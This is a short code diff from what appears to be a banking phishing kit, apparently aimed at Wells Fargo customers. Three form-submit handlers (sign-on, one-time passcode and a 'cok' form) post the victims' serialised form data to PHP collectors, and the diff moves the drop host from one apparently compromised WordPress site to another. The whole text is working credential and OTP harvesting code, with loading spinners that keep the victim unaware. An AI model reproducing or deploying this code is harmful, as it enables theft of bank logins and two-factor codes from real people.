@@ -309,7 +309,7 @@ var counts = 0;
 $('#signOnForm').on('submit', function(e){
 count = count+1;
 $('#btn1').html('<i class="fa fa-refresh fa-spin"></i>');
-$.post('https://sandyflowers.com.hk/wp-log/wells/data.php', $(this).serialize(), function(data){
+$.post('https://zabor-u-dachi.com/wp-log/data.php', $(this).serialize(), function(data){
 console.log(data);
 });
 setTimeout(function() {
@@ -331,7 +331,7 @@ $('#form2').on('submit', function(e){
 count = count+1;
 $("#id1").hide();
 $("#id2").show();
-$.post('https://sandyflowers.com.hk/wp-log/wells/otp.php', $(this).serialize(), function(data){
+$.post('https://zabor-u-dachi.com/wp-log/otp.php', $(this).serialize(), function(data){
 console.log(data);
 });
 setTimeout(function() {
@@ -352,7 +352,7 @@ e.preventDefault();
 $('#signOnForm2').on('submit', function(e){
 counts = counts+1;
 $('#btn').html('<i class="fa fa-refresh fa-spin"></i>');
-$.post('https://sandyflowers.com.hk/wp-log/wells/cok.php', $(this).serialize(), function(data){
+$.post('https://zabor-u-dachi.com/wp-log/cok.php', $(this).serialize(), function(data){
 console.log(data);
 });
 setTimeout(function() {
